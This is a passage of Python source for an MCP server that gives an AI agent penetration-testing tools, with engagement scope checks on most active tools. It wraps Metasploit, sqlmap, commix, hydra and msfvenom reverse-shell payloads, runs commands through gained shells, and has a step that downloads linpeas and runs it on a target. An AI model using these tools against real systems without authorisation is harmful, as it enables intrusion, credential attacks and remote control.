"""All MCP tools. Importing this module registers them on the FastMCP instance.

Conventions:
- Tools that touch a target call `require_scope(target)` first, which raises
  ScopeError if the target isn't in the active engagement's scope.
- Tools that just read/write engagement state call `require_engagement()`.
- `engagement_id` is optional everywhere — defaults to the active engagement.
- Long commands run with the configured timeout (`PENTAGI_MCP_TIMEOUT`, default 90s).
"""

from __future__ import annotations

import base64
import json
import shlex
import time
from typing import Any
from urllib.parse import urlsplit

from . import state
from .executor import (
    CONTAINER,
    ScopeError,
    docker_exec,
    host_exec,
    parse_http_headers,
    parse_nmap_xml,
    parse_searchsploit,
    parse_web_scan_output,
    prepare_web_target,
    require_engagement,
    require_scope,
    sni_proxy_list,
    sni_proxy_start,
    sni_proxy_stop,
)
from .server import mcp


def _err(msg: str) -> dict[str, Any]:
    return {"error": msg}


SCAN_PROFILES: dict[str, dict[str, Any]] = {
    # Kept safely below the common 120s MCP call ceiling.
    "quick": {
        "timeout": 85,
        "ferox_time_limit": "60s",
        "threads": 10,
        "nuclei_timeout": 5,
        "nuclei_retries": 0,
        "nuclei_rate_limit": 10,
    },
    # Still bounded for interactive MCP sessions; users can raise timeout explicitly.
    "normal": {
        "timeout": 110,
        "ferox_time_limit": "100s",
        "threads": 20,
        "nuclei_timeout": 8,
        "nuclei_retries": 1,
        "nuclei_rate_limit": 25,
    },
    # Opt-in deeper mode for clients with longer tool-call limits.
    "deep": {
        "timeout": 300,
        "ferox_time_limit": "240s",
        "threads": 40,
        "nuclei_timeout": 10,
        "nuclei_retries": 1,
        "nuclei_rate_limit": 75,
    },
}


def _profile(name: str) -> dict[str, Any]:
    try:
        return SCAN_PROFILES[name]
    except KeyError:
        raise ValueError(f"profile must be one of {', '.join(SCAN_PROFILES)}, got {name!r}") from None


def _duration(start: float) -> int:
    return int((time.monotonic() - start) * 1000)


def _http_header_flag(header_value: str, style: str) -> str:
    if not header_value:
        return ""
    header = f"Host: {header_value}"
    if style in {"ferox", "gobuster", "nuclei"}:
        return f" -H {shlex.quote(header)}"
    if style in {"sqlmap", "commix", "xsstrike"}:
        return f" --headers={shlex.quote(header)}"
    return ""


def _target_port(target_url: str) -> int:
    parsed = urlsplit(target_url)
    if parsed.port:
        return parsed.port
    return 443 if parsed.scheme == "https" else 80


# ============================================================================
# ENGAGEMENT
# ============================================================================


@mcp.tool()
def engagement_create(
    name: str,
    scope_targets: list[str],
    authorization_note: str = "",
    scope_excludes: list[str] | None = None,
) -> dict[str, Any]:
    """Create a new pentest engagement and set it active.

    scope_targets: IPs, CIDRs, hostnames, or glob patterns the engagement authorizes
    (e.g. ["10.0.0.0/24", "*.target.local"]). Every active tool refuses targets
    outside this list. scope_excludes: subset of the included space to explicitly
    block (e.g. ["10.0.0.5"] inside "10.0.0.0/24"). authorization_note: free text
    record of who/what authorized this engagement (kept for the report).
    """
    if not scope_targets:
        return _err("scope_targets cannot be empty — add at least one target/CIDR/host.")
    return state.create_engagement(name, authorization_note, scope_targets, scope_excludes or [])


@mcp.tool()
def engagement_list(include_closed: bool = False) -> list[dict[str, Any]]:
    """List engagements (active by default; include_closed=True to also list closed)."""
    return state.list_engagements(include_closed=include_closed)


@mcp.tool()
def engagement_get(engagement_id: str | None = None) -> dict[str, Any]:
    """Fetch engagement details, scope, finding count, and active shells.
    engagement_id defaults to the active engagement."""
    try:
        eid = require_engagement(engagement_id)
        return state.get_engagement(eid)
    except (ScopeError, ValueError) as e:
        return _err(str(e))


@mcp.tool()
def engagement_close(engagement_id: str | None = None, status: str = "closed") -> dict[str, Any]:
    """Close an engagement (status: closed | aborted). Clears the active pointer if it was active."""
    start = time.monotonic()
    try:
        eid = require_engagement(engagement_id)
        return {**state.close_engagement(eid, status), "duration_ms": _duration(start)}
    except (ScopeError, ValueError) as e:
        return _err(str(e))


@mcp.tool()
def engagement_set_active(engagement_id: str | None) -> dict[str, Any]:
    """Set (or clear, with engagement_id=None) the active engagement. Tools default
    to the active engagement when their `engagement_id` arg is omitted."""
    try:
        return {"active_engagement": state.set_active(engagement_id)}
    except ValueError as e:
        return _err(str(e))


# ============================================================================
# SCOPE
# ============================================================================


@mcp.tool()
def scope_add(target: str, is_excluded: bool = False, engagement_id: str | None = None) -> dict[str, Any]:
    """Add a target/CIDR/host/glob to the engagement's scope (or excludes).
    Use this to authorize an additional target mid-engagement."""
    try:
        eid = require_engagement(engagement_id)
        state.add_scope(eid, target, is_excluded)
        return {"engagement_id": eid, "added": target, "is_excluded": is_excluded}
    except (ScopeError, ValueError) as e:
        return _err(str(e))


@mcp.tool()
def scope_check(target: str, engagement_id: str | None = None) -> dict[str, Any]:
    """Check whether `target` is authorized under the engagement's scope without
    running any tool. Useful before a destructive command."""
    start = time.monotonic()
    try:
        eid = require_scope(target, engagement_id)
        return {"in_scope": True, "engagement_id": eid, "target": target, "duration_ms": _duration(start)}
    except ScopeError as e:
        return {"in_scope": False, "reason": str(e), "duration_ms": _duration(start)}


# ============================================================================
# SNI / CONNECT-HOST PROXY
# ============================================================================
# TLS services that vhost by SNI (Caddy, nginx, k8s ingress) refuse handshakes
# when the SNI in ClientHello doesn't match. The sandbox container reaches the
# host via `host.docker.internal`, but the service may only answer for SNI =
# `localhost`. These tools spawn a tagged socat inside the container that
# listens on 127.0.0.1:<port> and forwards to the real connect endpoint.
# Scan tools then target `https://<sni-name>:<port>/` and the right SNI flows
# naturally without per-tool flag plumbing.


@mcp.tool()
def sni_proxy_create(
    listen_name: str,
    listen_port: int,
    connect_host: str,
    connect_port: int | None = None,
) -> dict[str, Any]:
    """Spawn (or reuse) an SNI-forwarding socat inside the sandbox container.

    Use this when the target's TLS handshake requires a specific SNI/Host that
    the sandbox can't reach directly. Example for a Caddy on the macOS host
    that only answers SNI `localhost`:

        sni_proxy_create(
            listen_name="localhost",
            listen_port=8443,
            connect_host="host.docker.internal",
            connect_port=8443,
        )

    Then call `scan_vulns("https://localhost:8443")` etc. — the SNI sent matches
    what Caddy expects.

    Idempotent: re-running with the same args returns status='already_running'.
    For non-localhost SNI names, an /etc/hosts entry is added inside the container
    so DNS resolves to 127.0.0.1. Stop with sni_proxy_stop()."""
    cp = connect_port if connect_port is not None else listen_port
    return sni_proxy_start(listen_name, int(listen_port), connect_host, int(cp))


@mcp.tool()
def sni_proxy_ls() -> dict[str, Any]:
    """List active SNI proxies running in the sandbox container."""
    return {"proxies": sni_proxy_list()}


@mcp.tool()
def sni_proxy_kill(
    listen_port: int | None = None,
    connect_host: str | None = None,
) -> dict[str, Any]:
    """Stop SNI proxies. With no args, kills every PentAGI-MCP proxy.
    Pass `listen_port` and/or `connect_host` to filter."""
    return sni_proxy_stop(listen_port, connect_host)


# ============================================================================
# DIAGNOSTICS
# ============================================================================


@mcp.tool()
def doctor(
    target_url: str = "https://localhost:8443/",
    connect_host: str = "host.docker.internal",
    ensure_sni_proxy: bool = False,
) -> dict[str, Any]:
    """Preflight the local pentagi-mcp environment.

    Checks host Docker access, target reachability from the host, sandbox tool
    availability, sandbox-to-host reachability, and the common localhost/SNI
    pattern. With ensure_sni_proxy=True, starts the sandbox-local proxy needed
    for localhost-only TLS services."""
    port = _target_port(target_url)
    parsed = urlsplit(target_url)
    logical_host = parsed.hostname or "localhost"
    checks: dict[str, Any] = {
        "container": CONTAINER,
        "target_url": target_url,
        "connect_host": connect_host,
        "target_port": port,
    }

    docker_info = host_exec(["docker", "info"], timeout=10)
    checks["docker"] = {
        "ok": docker_info.returncode == 0,
        "returncode": docker_info.returncode,
        "stderr": docker_info.stderr[:2000],
    }

    host_curl = host_exec(
        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5", target_url],
        timeout=10,
    )
    checks["host_target"] = {
        "ok": host_curl.returncode == 0 and host_curl.stdout.strip() not in {"", "000"},
        "http_code": host_curl.stdout.strip(),
        "returncode": host_curl.returncode,
        "stderr": host_curl.stderr[:2000],
    }

    tool_cmd = (
        "echo '=== identity ==='; hostname; cat /etc/os-release 2>/dev/null | head -5; "
        "echo '=== tools ==='; "
        "for t in nmap sqlmap msfconsole nuclei feroxbuster searchsploit socat curl jq; do "
        '  if command -v $t >/dev/null; then echo "OK $t $(command -v $t)"; else echo "MISS $t"; fi; '
        "done"
    )
    tool_info = docker_exec(tool_cmd, timeout=30)
    checks["sandbox"] = {
        "ok": tool_info.returncode == 0,
        "returncode": tool_info.returncode,
        "stdout": tool_info.stdout,
        "stderr": tool_info.stderr,
    }

    hostdocker = docker_exec(
        f"getent hosts {shlex.quote(connect_host)} && "
        f"curl -sk -o /dev/null -w '%{{http_code}}' --max-time 5 https://{shlex.quote(connect_host)}:{port}/",
        timeout=15,
    )
    checks["sandbox_connect_host"] = {
        "ok": hostdocker.returncode == 0 and hostdocker.stdout.strip().splitlines()[-1:] not in ([], ["000"]),
        "returncode": hostdocker.returncode,
        "stdout": hostdocker.stdout,
        "stderr": hostdocker.stderr,
    }

    sni = docker_exec(
        f"curl -sk --connect-to {shlex.quote(logical_host)}:{port}:{shlex.quote(connect_host)}:{port} "
        f"-o /dev/null -w '%{{http_code}}' --max-time 5 {shlex.quote(target_url)}",
        timeout=15,
    )
    checks["sandbox_logical_sni"] = {
        "ok": sni.returncode == 0 and sni.stdout.strip() not in {"", "000"},
        "http_code": sni.stdout.strip(),
        "returncode": sni.returncode,
        "stderr": sni.stderr,
    }

    if ensure_sni_proxy:
        checks["sni_proxy"] = sni_proxy_start(logical_host, port, connect_host, port)

    checks["ok"] = (
        checks["docker"]["ok"]
        and checks["host_target"]["ok"]
        and checks["sandbox"]["ok"]
        and checks["sandbox_logical_sni"]["ok"]
    )
    return checks


# ============================================================================
# RECONNAISSANCE — passive
# ============================================================================


@mcp.tool()
def recon_whois(domain: str) -> dict[str, Any]:
    """Run whois on a domain. Passive; no scope check (lookups are public/free-form)."""
    r = docker_exec(f"whois {shlex.quote(domain)}", timeout=60)
    return r.as_dict()


@mcp.tool()
def recon_dns(domain: str, record_types: list[str] | None = None) -> dict[str, Any]:
    """Resolve DNS records for `domain`. record_types defaults to A, AAAA, MX, NS, TXT, SOA, CNAME."""
    types = record_types or ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]
    out: dict[str, Any] = {"domain": domain, "records": {}}
    for t in types:
        r = docker_exec(f"dig +short {shlex.quote(t)} {shlex.quote(domain)}", timeout=30)
        out["records"][t] = [ln for ln in r.stdout.splitlines() if ln.strip()]
    return out


@mcp.tool()
def recon_subdomains(domain: str, source: str = "subfinder") -> dict[str, Any]:
    """Enumerate subdomains of `domain`. source: subfinder | amass | crt.sh
    (crt.sh hits a public CT log via curl; subfinder/amass must be installed in the container)."""
    if source == "crt.sh":
        cmd = f"curl -s 'https://crt.sh/?q=%25.{shlex.quote(domain)}&output=json' | jq -r '.[].name_value' | sort -u"
    elif source == "amass":
        cmd = f"amass enum -passive -d {shlex.quote(domain)}"
    else:
        cmd = f"subfinder -silent -d {shlex.quote(domain)}"
    r = docker_exec(cmd, timeout=300)
    subs = sorted({s.strip() for s in r.stdout.splitlines() if s.strip()})
    return {"domain": domain, "source": source, "count": len(subs), "subdomains": subs, "stderr": r.stderr}


@mcp.tool()
def recon_osint(target: str, sources: str = "all", limit: int = 200) -> dict[str, Any]:
    """Run theHarvester for emails / hosts / IPs related to `target`. sources: 'all'
    or a theHarvester source name (e.g. 'bing,duckduckgo,crtsh')."""
    cmd = f"theHarvester -d {shlex.quote(target)} -b {shlex.quote(sources)} -l {int(limit)}"
    return docker_exec(cmd, timeout=300).as_dict()


# ============================================================================
# SCANNING — active
# ============================================================================


@mcp.tool()
def scan_ports(
    target: str,
    ports: str = "1-1000",
    technique: str = "-sS",
    timeout: int = 90,
    engagement_id: str | None = None,
) -> dict[str, Any]:
    """Nmap port scan against `target`. ports: nmap port syntax (e.g. '1-65535',
    '22,80,443', '-' for all). technique: nmap flag block (default '-sS' SYN scan;
    use '-sT' for TCP connect if no privs, '-sU' for UDP). Returns parsed host/port summary."""
    start = time.monotonic()
    try:
        require_scope(target, engagement_id)
    except ScopeError as e:
        return _err(str(e))
    flags = technique if technique.startswith("-") else f"-{technique}"
    r = docker_exec(f"nmap {flags} -p {shlex.quote(ports)} -oX - -T4 {shlex.quote(target)}", timeout=timeout)
    return {
        "parsed": parse_nmap_xml(r.stdout),
        "stderr": r.stderr,
        "returncode": r.returncode,
        "timed_out": r.timed_out,
        "duration_ms": _duration(start),
    }


@mcp.tool()
def scan_services(
    target: str,
    ports: str = "1-10000",
    http_probe: bool = True,
    timeout: int = 90,
    connect_host: str | None = None,
    connect_port: int | None = None,
    tls_sni: str | None = None,
    http_host: str | None = None,
    engagement_id: str | None = None,
) -> dict[str, Any]:
    """Nmap service/version detection (-sV) against `target`.

    If `http_probe=True` (default) and any detected service looks HTTP/HTTPS,
    follow up with `curl -skI` to capture the `server:` header and friends —
    nmap's -sV often labels a Caddy/nginx/Apache service as just `https-alt`.

    For localhost-only TLS services, pass connect_host/tls_sni/http_host so the
    HTTP probe can connect to one host while sending another SNI/Host."""
    start = time.monotonic()
    try:
        require_scope(target, engagement_id)
    except ScopeError as e:
        return _err(str(e))
    r = docker_exec(
        f"nmap -sV -p {shlex.quote(ports)} -oX - -T4 {shlex.quote(target)}",
        timeout=timeout,
    )
    parsed = parse_nmap_xml(r.stdout)
    if http_probe:
        http_known = {"http", "https", "https-alt", "http-alt", "http-proxy", "http-rpc-epmap"}
        tls_ports = {443, 8443, 8444, 9443}
        for host in parsed.get("hosts", []):
            for port in host.get("ports", []):
                if port.get("state") != "open":
                    continue
                svc = (port.get("service") or "").lower()
                is_http_ish = svc in http_known or port["port"] in {80, 443, 8080, 8443, 8000, 3000, 5000, 8888}
                if not is_http_ish:
                    continue
                is_tls = "ssl" in svc or "https" in svc or port["port"] in tls_ports
                scheme = "https" if is_tls else "http"
                url = f"{scheme}://{target}:{port['port']}/"
                try:
                    wt = prepare_web_target(
                        url,
                        engagement_id,
                        connect_host=connect_host,
                        connect_port=connect_port or port["port"],
                        tls_sni=tls_sni,
                        http_host=http_host,
                    )
                except (ScopeError, RuntimeError, ValueError) as e:
                    port["http_probe"] = {"url": url, "error": str(e)}
                    continue
                hflag = _http_header_flag(wt.http_host, "nuclei") if wt.host_header_needed else ""
                hr = docker_exec(
                    f"curl -skI --max-time 8{hflag} {shlex.quote(wt.effective_url)}",
                    timeout=15,
                )
                port["http_probe"] = {
                    "url": url,
                    "effective_url": wt.effective_url,
                    "connect_host": wt.connect_host,
                    "connect_port": wt.connect_port,
                    "tls_sni": wt.tls_sni,
                    "http_host": wt.http_host,
                    "proxy": wt.proxy,
                    "returncode": hr.returncode,
                    "timed_out": hr.timed_out,
                    **parse_http_headers(hr.stdout),
                }
    return {
        "parsed": parsed,
        "stderr": r.stderr,
        "returncode": r.returncode,
        "timed_out": r.timed_out,
        "duration_ms": _duration(start),
    }


@mcp.tool()
def scan_os(target: str, timeout: int = 90, engagement_id: str | None = None) -> dict[str, Any]:
    """Nmap OS fingerprint (-O) against `target`. Requires raw sockets in the container."""
    start = time.monotonic()
    try:
        require_scope(target, engagement_id)
    except ScopeError as e:
        return _err(str(e))
    r = docker_exec(f"nmap -O -oX - {shlex.quote(target)}", timeout=timeout)
    return {
        "parsed": parse_nmap_xml(r.stdout),
        "stderr": r.stderr,
        "returncode": r.returncode,
        "timed_out": r.timed_out,
        "duration_ms": _duration(start),
    }


@mcp.tool()
def scan_web(
    target_url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,txt",
    threads: int = 0,
    time_limit: str = "",
    timeout: int = 0,
    profile: str = "quick",
    follow_redirects: bool = False,
    connect_host: str | None = None,
    connect_port: int | None = None,
    tls_sni: str | None = None,
    http_host: str | None = None,
    engagement_id: str | None = None,
) -> dict[str, Any]:
    """Directory bust against `target_url` with feroxbuster (falls back to gobuster).
    `target_url` must be http(s)://host[:port]/path.

    `profile` controls bounded defaults: quick | normal | deep. For local HTTPS
    where the sandbox must connect to host.docker.internal but send SNI localhost,
    pass connect_host/tls_sni/http_host. The tool returns parsed hits plus raw output."""
    start = time.monotonic()
    try:
        cfg = _profile(profile)
        wt = prepare_web_target(
            target_url,
            engagement_id,
            connect_host=connect_host,
            connect_port=connect_port,
            tls_sni=tls_sni,
            http_host=http_host,
        )
    except (ScopeError, RuntimeError, ValueError) as e:
        return _err(str(e))
    effective_threads = int(threads or cfg["threads"])
    effective_time_limit = time_limit or str(cfg["ferox_time_limit"])
    effective_timeout = int(timeout or cfg["timeout"])
    ext_flag = f" -x {shlex.quote(extensions)}" if extensions else ""
    redirect_flag = " -r" if follow_redirects else ""
    ferox_header = _http_header_flag(wt.http_host, "ferox") if wt.host_header_needed else ""
    gobuster_header = _http_header_flag(wt.http_host, "gobuster") if wt.host_header_needed else ""
    cmd = (
        f"if command -v feroxbuster >/dev/null; then "
        f"  feroxbuster -u {shlex.quote(wt.effective_url)} -w {shlex.quote(wordlist)} "
        f"  {ext_flag} -t {effective_threads} --time-limit {shlex.quote(effective_time_limit)} "
        f"  -k --no-recursion --no-state -q{redirect_flag}{ferox_header}; "
        f"else "
        f"  gobuster dir -u {shlex.quote(wt.effective_url)} -w {shlex.quote(wordlist)} "
        f"  {ext_flag} -t {effective_threads} -k -q{gobuster_header}; "
        f"fi"
    )
    r = docker_exec(cmd, timeout=effective_timeout)
    parsed = parse_web_scan_output(r.stdout)
    return {
        **r.as_dict(),
        "target": {
            "original_url": wt.original_url,
            "effective_url": wt.effective_url,
            "connect_host": wt.connect_host,
            "connect_port": wt.connect_port,
            "tls_sni": wt.tls_sni,
            "http_host": wt.http_host,
            "checked_scope": wt.checked_scope,
            "proxy": wt.proxy,
        },
        "profile": profile,
        "time_limit": effective_time_limit,
        "parsed": parsed,
        "count": len(parsed),
        "duration_ms": _duration(start),
    }


@mcp.tool()
def scan_vulns(
    target: str,
    templates: str = "",
    severity: str = "medium,high,critical",
    profile: str = "quick",
    timeout: int = 0,
    connect_host: str | None = None,
    connect_port: int | None = None,
    tls_sni: str | None = None,
    http_host: str | None = None,
    engagement_id: str | None = None,
) -> dict[str, Any]:
    """Run nuclei against `target` (URL or host). templates: optional nuclei
    -t value (e.g. 'cves/', 'http/exposures'). severity: comma-separated.

    `profile` defaults to quick and is bounded for interactive MCP clients.
    For split local networking, pass connect_host/tls_sni/http_host."""
    start = time.monotonic()
    try:
        cfg = _profile(profile)
        wt = prepare_web_target(
            target if "://" in target else f"https://{target}",
            engagement_id,
            connect_host=connect_host,
            connect_port=connect_port,
            tls_sni=tls_sni,
            http_host=http_host,
        )
    except (ScopeError, RuntimeError, ValueError) as e:
        return _err(str(e))
    effective_timeout = int(timeout or cfg["timeout"])
    tflag = f"-t {shlex.quote(templates)} " if templates else ""
    hflag = _http_header_flag(wt.http_host, "nuclei") if wt.host_header_needed else ""
    cmd = (
        f"nuclei -u {shlex.quote(wt.effective_url)} {tflag}"
        f"-s {shlex.quote(severity)} -j -silent -nc -ni "
        f"-timeout {int(cfg['nuclei_timeout'])} -retries {int(cfg['nuclei_retries'])} "
        f"-rl {int(cfg['nuclei_rate_limit'])}{hflag}"
    )
    r = docker_exec(cmd, timeout=effective_timeout)
    findings = []
    for raw_line in r.stdout.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        try:
            findings.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return {
        **r.as_dict(),
        "target": {
            "original_url": wt.original_url,
            "effective_url": wt.effective_url,
            "connect_host": wt.connect_host,
            "connect_port": wt.connect_port,
            "tls_sni": wt.tls_sni,
            "http_host": wt.http_host,
            "checked_scope": wt.checked_scope,
            "proxy": wt.proxy,
        },
        "profile": profile,
        "findings": findings,
        "count": len(findings),
        "duration_ms": _duration(start),
    }


# ============================================================================
# VULN RESEARCH
# ============================================================================


@mcp.tool()
def cve_lookup(cve_id: str, reference_limit: int = 10) -> dict[str, Any]:
    """Fetch CVE detail from the NVD public JSON API (passive — no scope check).
    Returns description, CVSS, and up to `reference_limit` reference URLs
    (set reference_limit=0 to return them all). `references_total` always reflects
    the unfiltered count."""
    cmd = f"curl -s 'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={shlex.quote(cve_id)}'"
    r = docker_exec(cmd, timeout=60)
    try:
        data = json.loads(r.stdout)
        vuln = (data.get("vulnerabilities") or [{}])[0].get("cve", {})
        descs = vuln.get("descriptions", [])
        metrics = vuln.get("metrics", {})
        cvss = []
        for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            cvss += [m.get("cvssData", {}) for m in metrics.get(k, [])]
        all_refs = [ref["url"] for ref in vuln.get("references", [])]
        refs = all_refs if reference_limit <= 0 else all_refs[:reference_limit]
        return {
            "id": vuln.get("id"),
            "description": next((d["value"] for d in descs if d.get("lang") == "en"), ""),
            "cvss": cvss,
            "references": refs,
            "references_total": len(all_refs),
            "references_truncated": len(refs) < len(all_refs),
            "published": vuln.get("published"),
        }
    except (json.JSONDecodeError, KeyError, IndexError) as e:
        return {"error": f"NVD parse failed: {e}", "raw": r.stdout[:2000]}


@mcp.tool()
def exploit_search(query: str, limit: int = 20, include_no_match: bool = False) -> dict[str, Any]:
    """searchsploit lookup against the local exploit-db mirror, ranked by relevance.

    searchsploit matches across title, author, and path — so a query like 'Caddy' returns
    every exploit credited to an author named Caddy. We rank title > path > author and
    drop pure no-match rows unless `include_no_match=True`. Each row carries a
    `match_reason` field. Results are truncated to `limit`."""
    cmd = f"searchsploit --json {shlex.quote(query)} 2>/dev/null || searchsploit {shlex.quote(query)}"
    r = docker_exec(cmd, timeout=60)
    raw = parse_searchsploit(r.stdout)
    q = query.lower().strip()

    def classify(row: dict[str, str]) -> tuple[int, str]:
        title = (row.get("title") or row.get("Title") or "").lower()
        author = (row.get("author") or row.get("Author") or "").lower()
        path = (row.get("path") or row.get("Path") or "").lower()
        if q and q in title:
            return 3, "title_match"
        if q and q in path:
            return 2, "path_match"
        if q and q in author:
            return 1, "author_match"
        return 0, "no_match"

    scored: list[dict[str, Any]] = []
    for row in raw:
        score, reason = classify(row)
        if score == 0 and not include_no_match:
            continue
        scored.append({**row, "_score": score, "match_reason": reason})
    scored.sort(key=lambda r: -r["_score"])
    truncated = len(scored) > limit
    return {
        "query": query,
        "results": scored[:limit],
        "returned": min(len(scored), limit),
        "total_after_filtering": len(scored),
        "total_raw": len(raw),
        "truncated": truncated,
    }


@mcp.tool()
def service_check_vulns(service: str, version: str) -> dict[str, Any]:
    """Cross-product of searchsploit + a sanitized free-text version search.
    Use after `scan_services` to investigate identified product/version pairs."""
    q = f"{service} {version}".strip()
    return exploit_search(q)


# ============================================================================
# EXPLOIT
# ============================================================================


@mcp.tool()
def exploit_run(
    target: str,
    msf_module: str,
    options: dict[str, str] | None = None,
    payload: str | None = None,
    engagement_id: str | None = None,
) -> dict[str, Any]:
    """Run a Metasploit module non-interactively. msf_module: full path
    (e.g. 'exploit/multi/http/struts2_content_type_ognl'). options: dict of module
    options (RHOSTS is set automatically from `target`). payload: optional payload to set."""
    try:
        require_scope(target, engagement_id)
    except ScopeError as e:
        return _err(str(e))
    opts = options or {}
    opts.setdefault("RHOSTS", target)
    set_lines = [f"set {k} {v}" for k, v in opts.items()]
    if payload:
        set_lines.append(f"set PAYLOAD {payload}")
    script = "; ".join([f"use {msf_module}", *set_lines, "run -z", "exit"])
    cmd = f"msfconsole -q -n -x {shlex.quote(script)}"
    return docker_exec(cmd, timeout=1800).as_dict()


@mcp.tool()
def web_exploit(
    target_url: str,
    technique: str = "sqlmap",
    data: str = "",
    extra_args: str = "--batch --level=2 --risk=1",
    timeout: int = 90,
    connect_host: str | None = None,
    connect_port: int | None = None,
    tls_sni: str | None = None,
    http_host: str | None = None,
    engagement_id: str | None = None,
) -> dict[str, Any]:
    """Web vulnerability exploitation. technique: sqlmap | xsstrike | commix.
    `data` is the POST body for techniques that need it; `extra_args` is appended raw.
    Supports split connect/SNI/Host settings like scan_web and scan_vulns."""
    start = time.monotonic()
    try:
        wt = prepare_web_target(
            target_url,
            engagement_id,
            connect_host=connect_host,
            connect_port=connect_port,
            tls_sni=tls_sni,
            http_host=http_host,
        )
    except (ScopeError, RuntimeError, ValueError) as e:
        return _err(str(e))
    data_flag = f"--data {shlex.quote(data)} " if data else ""
    hflag = _http_header_flag(wt.http_host, technique) if wt.host_header_needed else ""
    if technique == "sqlmap":
        cmd = f"sqlmap -u {shlex.quote(wt.effective_url)} {data_flag}{extra_args}{hflag}"
    elif technique == "xsstrike":
        cmd = f"xsstrike -u {shlex.quote(wt.effective_url)} {extra_args}{hflag}"
    elif technique == "commix":
        cmd = f"commix -u {shlex.quote(wt.effective_url)} {data_flag}{extra_args}{hflag}"
    else:
        return _err(f"unknown technique: {technique}")
    r = docker_exec(cmd, timeout=timeout)
    return {
        **r.as_dict(),
        "target": {
            "original_url": wt.original_url,
            "effective_url": wt.effective_url,
            "connect_host": wt.connect_host,
            "connect_port": wt.connect_port,
            "tls_sni": wt.tls_sni,
            "http_host": wt.http_host,
            "checked_scope": wt.checked_scope,
            "proxy": wt.proxy,
        },
        "duration_ms": _duration(start),
    }


@mcp.tool()
def password_attack(
    target: str,
    service: str,
    user_list: str = "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
    pass_list: str = "/usr/share/wordlists/rockyou.txt",
    port: int | None = None,
    extra_args: str = "",
    engagement_id: str | None = None,
) -> dict[str, Any]:
    """Online password attack with hydra. service: ssh | ftp | http-post-form | smb | rdp | mysql | postgres | etc.
    Use sparingly — hydra is loud and slow. Lockouts will trip on real systems."""
    try:
        require_scope(target, engagement_id)
    except ScopeError as e:
        return _err(str(e))
    port_flag = f"-s {int(port)} " if port else ""
    cmd = (
        f"hydra -L {shlex.quote(user_list)} -P {shlex.quote(pass_list)} {port_flag}"
        f"{extra_args} {shlex.quote(target)} {shlex.quote(service)}"
    )
    return docker_exec(cmd, timeout=3600).as_dict()


@mcp.tool()
def payload_generate(
    payload: str,
    lhost: str,
    lport: int,
    format: str = "elf",
    arch: str = "x64",
    out_path: str | None = None,
    extra_options: dict[str, str] | None = None,
) -> dict[str, Any]:
    """Generate a payload with msfvenom. payload: msf payload string
    (e.g. 'linux/x64/meterpreter/reverse_tcp'). format: elf, exe, raw, python, sh, war, etc.
    out_path defaults to /tmp/payload.<format> inside the container."""
    out_path = out_path or f"/tmp/payload.{format}"
    extras = " ".join(f"{k}={v}" for k, v in (extra_options or {}).items())
    cmd = (
        f"msfvenom -p {shlex.quote(payload)} LHOST={shlex.quote(lhost)} LPORT={int(lport)} "
        f"-f {shlex.quote(format)} -a {shlex.quote(arch)} {extras} -o {shlex.quote(out_path)}"
    )
    r = docker_exec(cmd, timeout=300)
    return {**r.as_dict(), "out_path": out_path}


# ============================================================================
# POST-EXPLOITATION
# ============================================================================


@mcp.tool()
def shell_register(
    target: str,
    shell_type: str,
    connection_string: str,
    notes: str = "",
    engagement_id: str | None = None,
) -> dict[str, Any]:
    """Register a shell you've gained on `target`. shell_type: ssh | netcat | meterpreter | webshell | other.
    connection_string is whatever you want stored — host:port, msf session id, full ssh cmd, URL, etc."""
    try:
        eid = require_scope(target, engagement_id)
        return state.register_shell(eid, target, shell_type, connection_string, notes or None)
    except ScopeError as e:
        return _err(str(e))


@mcp.tool()
def shell_list(include_dead: bool = False, engagement_id: str | None = None) -> dict[str, Any]:
    """List shells registered on the engagement."""
    try:
        eid = require_engagement(engagement_id)
        return {"engagement_id": eid, "shells": state.list_shells(eid, include_dead=include_dead)}
    except ScopeError as e:
        return _err(str(e))


@mcp.tool()
def shell_exec(shell_id: str, command: str, raw_invocation: bool = False) -> dict[str, Any]:
    """Run `command` on a registered shell. If raw_invocation=True, `command` is the
    full shell pipeline to run on the host (you handle the connection). Otherwise we
    infer based on shell_type: ssh -> 'ssh <connection_string> <command>',
    meterpreter -> 'msfconsole -q -x \"sessions -i <id> -c <command>\"',
    webshell/netcat/other -> raw_invocation only (set raw_invocation=True)."""
    try:
        sh = state.get_shell(shell_id)
    except ValueError as e:
        return _err(str(e))
    cs = sh["connection_string"]
    st = sh["shell_type"]
    if raw_invocation:
        cmd = command
    elif st == "ssh":
        cmd = f"ssh -o StrictHostKeyChecking=no {cs} {shlex.quote(command)}"
    elif st == "meterpreter":
        cmd = f"msfconsole -q -x {shlex.quote(f'sessions -i {cs} -c {command}; exit')}"
    else:
        return _err(
            f"shell_type {st!r} requires raw_invocation=True with an explicit pipeline (connection_string={cs!r})"
        )
    return docker_exec(cmd, timeout=600).as_dict()


@mcp.tool()
def shell_mark_dead(shell_id: str) -> dict[str, Any]:
    """Mark a shell as dead (lost the connection, host patched, target rebooted)."""
    try:
        state.get_shell(shell_id)
        state.mark_shell_dead(shell_id)
        return {"shell_id": shell_id, "status": "dead"}
    except ValueError as e:
        return _err(str(e))


@mcp.tool()
def privesc_check(shell_id: str, os: str = "linux") -> dict[str, Any]:
    """Run a privilege-escalation enumeration script through a registered shell.
    os: linux (linpeas) | windows (winpeas). Downloads the script into /tmp on the
    target via shell_exec; review the output for misconfigurations / kernel exploits."""
    try:
        sh = state.get_shell(shell_id)
    except ValueError as e:
        return _err(str(e))
    if os == "linux":
        script_url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
        remote_cmd = f"cd /tmp && curl -sL {script_url} -o /tmp/linpeas.sh && bash /tmp/linpeas.sh -a"
    elif os == "windows":
        return _err(
            "windows privesc_check via auto-exec not implemented; run winPEAS manually and shell_register the output"
        )
    else:
        return _err(f"unknown os: {os}")
    return shell_exec(shell_id=sh["id"], command=remote_cmd, raw_invocation=False)


# ============================================================================
# FINDINGS & EVIDENCE
# ============================================================================


@mcp.tool()
def finding_add(
    severity: str,
    title: str,
    description: str = "",
    target: str = "",
